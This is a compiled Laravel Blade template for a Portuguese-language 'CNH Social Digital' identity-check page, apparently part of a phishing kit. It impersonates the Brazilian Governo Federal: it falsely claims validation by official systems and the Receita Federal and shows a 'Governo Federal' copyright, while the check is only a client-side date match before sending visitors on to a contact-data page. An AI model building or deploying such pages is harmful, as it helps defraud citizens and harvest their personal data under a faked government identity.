<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">CNH Social Digital</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6 space-y-6">
                    <div class="flex items-start justify-between">
                        <div>
                            <h1 class="text-2xl md:text-3xl font-bold text-govBlue mb-2">Verificação de Identidade</h1>
                        </div>
                    </div>
                    <p class="text-sm text-foreground leading-relaxed">Para garantir a segurança do seu processo, por favor confirme sua data de nascimento selecionando a opção correta abaixo.</p>

                    <div class="space-y-3">
                        <div class="flex items-center gap-2">
                            <div class="bg-govBlue text-white rounded-full w-7 h-7 flex items-center justify-center font-bold text-sm">1</div>
                            <h2 class="text-base font-semibold text-foreground">Selecione sua Data de Nascimento:</h2>
                        </div>
                        <div role="radiogroup" aria-required="false" dir="ltr" class="grid gap-2 space-y-2 options" tabindex="0" style="outline: none;">
                            <div class="option flex items-center space-x-3 p-3 rounded-lg border border-border hover:bg-accent/50 transition-colors cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="03/06/1987" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="date-0" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="peer-disabled:cursor-not-allowed peer-disabled:opacity-70 text-sm font-normal cursor-pointer flex-1" for="date-0">03/06/1987</label>
                            </div>
                            <div class="option flex items-center space-x-3 p-3 rounded-lg border border-border hover:bg-accent/50 transition-colors cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="15/07/1965" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="date-1" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="peer-disabled:cursor-not-allowed peer-disabled:opacity-70 text-sm font-normal cursor-pointer flex-1" for="date-1">15/07/1965</label>
                            </div>
                            <div class="option flex items-center space-x-3 p-3 rounded-lg border border-border hover:bg-accent/50 transition-colors cursor-pointer">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="25/08/1954" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="date-2" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="peer-disabled:cursor-not-allowed peer-disabled:opacity-70 text-sm font-normal cursor-pointer flex-1" for="date-2">25/08/1954</label>
                            </div>
                            <div class="option flex items-center space-x-3 p-3 rounded-lg border border-border hover:bg-accent/50 transition-colors cursor-pointer date">
                                <button type="button" role="radio" aria-checked="false" data-state="unchecked" value="" class="aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50" id="date-3" tabindex="-1" data-radix-collection-item=""></button>
                                <label class="peer-disabled:cursor-not-allowed peer-disabled:opacity-70 text-sm font-normal cursor-pointer flex-1" for="date-3"></label>
                            </div>
                        </div>
                    </div>
                    <div class="bg-muted/50 rounded-lg p-3 flex gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-info h-4 w-4 text-muted-foreground flex-shrink-0 mt-0.5"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg>
                        <div class="space-y-1">
                            <p class="text-xs font-semibold text-foreground">Por que verificamos sua data de nascimento?</p>
                            <p class="text-xs text-muted-foreground">Esta verificação é necessária para confirmar sua identidade e garantir a segurança do processo de inscrição.</p>
                        </div>
                    </div>
                    <div class="flex items-center sm:items-center gap-2 p-4 mb-4 text-sm text-fg-danger-strong rounded-base bg-danger-soft hidden" role="alert" data-testid="error-message">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-alert h-4 w-4 flex-shrink-0"><circle cx="12" cy="12" r="10"></circle><line x1="12" x2="12" y1="8" y2="12"></line><line x1="12" x2="12.01" y1="16" y2="16"></line></svg>
                        <span class="font-medium">Atenção!</span> A opção selecionada não confere com o registrado na receita federal.
                    </div>
                    <button id="btnContinuar" class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 h-11 rounded-md px-8 w-full py-5 text-base font-semibold transition-colors bg-govBlue hover:bg-govBlue/90 text-white" disabled>Continuar</button>
                    <div class="border-l-4 border-govBlue bg-govBlue/5 p-3 rounded space-y-2">
                        <h3 class="text-base font-bold text-foreground">Processo 100% Seguro</h3>
                        <p class="text-xs text-muted-foreground">Todas as informações são validadas pelos sistemas oficiais do Governo Federal, garantindo total segurança e autenticidade em seu processo de inscrição.</p>
                        <div class="grid grid-cols-3 gap-3 mt-3">
                            <div class="text-center">
                                <div class="bg-background rounded-lg p-2 mb-1 inline-block">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield h-5 w-5 text-govBlue"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>
                                </div>
                                <p class="text-[10px] text-govBlue font-semibold leading-tight">Verificação de Identidade</p>
                            </div>
                            <div class="text-center">
                                <div class="bg-background rounded-lg p-2 mb-1 inline-block">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-lock h-5 w-5 text-govBlue"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                                </div>
                                <p class="text-[10px] text-govBlue font-semibold leading-tight">Proteção SSL</p>
                            </div>
                            <div class="text-center">
                                <div class="bg-background rounded-lg p-2 mb-1 inline-block">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-file-check h-5 w-5 text-govBlue"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path><path d="m9 15 2 2 4-4"></path></svg>
                                </div>
                                <p class="text-[10px] text-govBlue font-semibold leading-tight">Dados Oficiais</p>
                            </div>
                        </div>
                    </div>
                    <div class="text-center pt-4"></div>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<style>
.text-fg-danger-strong {
    color: oklch(0.41 0.159 10.272);
}
.bg-danger-soft {
    background-color: oklch(0.969 0.015 12.422);
}
.rounded-base {
    border-radius: 12px;
}
.option:hover{background-color:rgb(239 246 255);}
</style>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
    <script>
        const userData = JSON.parse(sessionStorage.getItem("userData"));
        if(!userData){
            window.location.href = "<?php echo e(url('/login')); ?>";
        }

        let selecionado = '';
        
        $('.date').find('button').val(userData.NASC);
        $('.date').find('label').text(userData.NASC);

        $(document).on('click', '.option', function(){
            $('.option').find('button').html('');
            $(this).find('button').html(`<span data-state="checked" class="flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle h-2.5 w-2.5 fill-current text-current"><circle cx="12" cy="12" r="10"></circle></svg></span>`);
            selecionado = $(this).find('label').text();
            $('#btnContinuar').attr('disabled', false);
        });

        $(document).on('click', '#btnContinuar', function(){
            $(this).attr('disabled', true).text('Validando...');
            setTimeout(() => {
                if(selecionado == userData.NASC){
                    window.location.href = "<?php echo e(url('/informacoes-de-contato')); ?>";
                }else{
                    $(this).attr('disabled', false).text('Continuar');
                    $('div[data-testid="error-message"]').removeClass('hidden').addClass('flex');
                    setTimeout(() => {
                        $('div[data-testid="error-message"]').removeClass('flex').addClass('hidden');
                    }, 4200);
                }
            }, 1200); 
        });

    </script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/verificacao.blade.php ENDPATH**/ ?>